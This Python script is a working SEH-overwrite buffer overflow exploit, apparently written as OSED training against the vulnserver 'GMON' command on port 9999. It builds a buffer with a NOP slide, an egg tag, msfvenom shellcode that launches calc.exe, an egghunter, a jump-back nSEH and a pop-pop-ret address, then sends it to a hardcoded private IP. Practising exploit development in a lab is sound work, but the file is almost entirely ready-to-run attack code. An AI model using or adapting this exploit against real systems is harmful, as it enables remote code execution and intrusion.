#!/usr/bin/python3
import sys
import socket

sys.path.insert(0, '../../osed-scripts')
from utils import RopChain, sanity_check, get_connection

def get_pattern():
    # msf-pattern_create -l 5000
    pattern = b""

    return pattern


def get_egghunter() -> bytes:
    #!mona egg -t srbx -cpb "\x00"
    egghunter = (
        b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        b"\xef\xb8\x73\x72\x62\x78\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

    return egghunter


def get_payload() -> bytes:

    # msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f py EXITFUNC=thread 
    buf =  b""
    buf += b"\xda\xc8\xbd\x3f\x7f\x5d\x30\xd9\x74\x24\xf4\x5f\x33"
    buf += b"\xc9\xb1\x31\x31\x6f\x18\x03\x6f\x18\x83\xef\xc3\x9d"
    buf += b"\xa8\xcc\xd3\xe0\x53\x2d\x23\x85\xda\xc8\x12\x85\xb9"
    buf += b"\x99\x04\x35\xc9\xcc\xa8\xbe\x9f\xe4\x3b\xb2\x37\x0a"
    buf += b"\x8c\x79\x6e\x25\x0d\xd1\x52\x24\x8d\x28\x87\x86\xac"
    buf += b"\xe2\xda\xc7\xe9\x1f\x16\x95\xa2\x54\x85\x0a\xc7\x21"
    buf += b"\x16\xa0\x9b\xa4\x1e\x55\x6b\xc6\x0f\xc8\xe0\x91\x8f"
    buf += b"\xea\x25\xaa\x99\xf4\x2a\x97\x50\x8e\x98\x63\x63\x46"
    buf += b"\xd1\x8c\xc8\xa7\xde\x7e\x10\xef\xd8\x60\x67\x19\x1b"
    buf += b"\x1c\x70\xde\x66\xfa\xf5\xc5\xc0\x89\xae\x21\xf1\x5e"
    buf += b"\x28\xa1\xfd\x2b\x3e\xed\xe1\xaa\x93\x85\x1d\x26\x12"
    buf += b"\x4a\x94\x7c\x31\x4e\xfd\x27\x58\xd7\x5b\x89\x65\x07"
    buf += b"\x04\x76\xc0\x43\xa8\x63\x79\x0e\xa6\x72\x0f\x34\x84"
    buf += b"\x75\x0f\x37\xb8\x1d\x3e\xbc\x57\x59\xbf\x17\x1c\x85"
    buf += b"\x5d\xb2\x68\x2e\xf8\x57\xd1\x33\xfb\x8d\x15\x4a\x78"
    buf += b"\x24\xe5\xa9\x60\x4d\xe0\xf6\x26\xbd\x98\x67\xc3\xc1"
    buf += b"\x0f\x87\xc6\xa1\xce\x1b\x8a\x0b\x75\x9c\x29\x54"

    return buf


def get_seh_overwrite() -> bytes:
    total_len = 5000
    offset_to_nseh = 3495
    #offset_to_nseh = 3547 #WIN 10
    
    egg = b'srbxsrbx'

    # nop slide
    seh_chain = b''
    seh_chain = b'\x90' * 1500
    # egg + shellcode
    seh_chain += egg
    seh_chain += get_payload()
    # nop slide
    seh_chain += b'\x90' * (offset_to_nseh - len(seh_chain) -len(get_egghunter()))
    # egghunter
    seh_chain += get_egghunter()

    seh_chain += b'\xeb\xde\x41\x41' # nseh - jmp back 32 bytes
    seh_chain += b'\xb4\x10\x50\x62' # seh - ppr or similar

    seh_chain += b'D' * (total_len - len(seh_chain))

    #seh_chain = get_pattern()

    return seh_chain


def send_exploit(sock: socket.socket, buffer: bytes, read_response=False):
    sock.send(b'GMON /.:/' + buffer)
    print(f'[+] sent {len(buffer)} bytes')

    if read_response:
        resp = sock.recv(4096)
        print('[*] response:')
        print(resp)


def main():
    # Windows XP
    conn = get_connection('192.168.1.107', 9999)  # todo change ip/port
    send_exploit(conn, get_seh_overwrite())


if __name__ == '__main__':
    main()
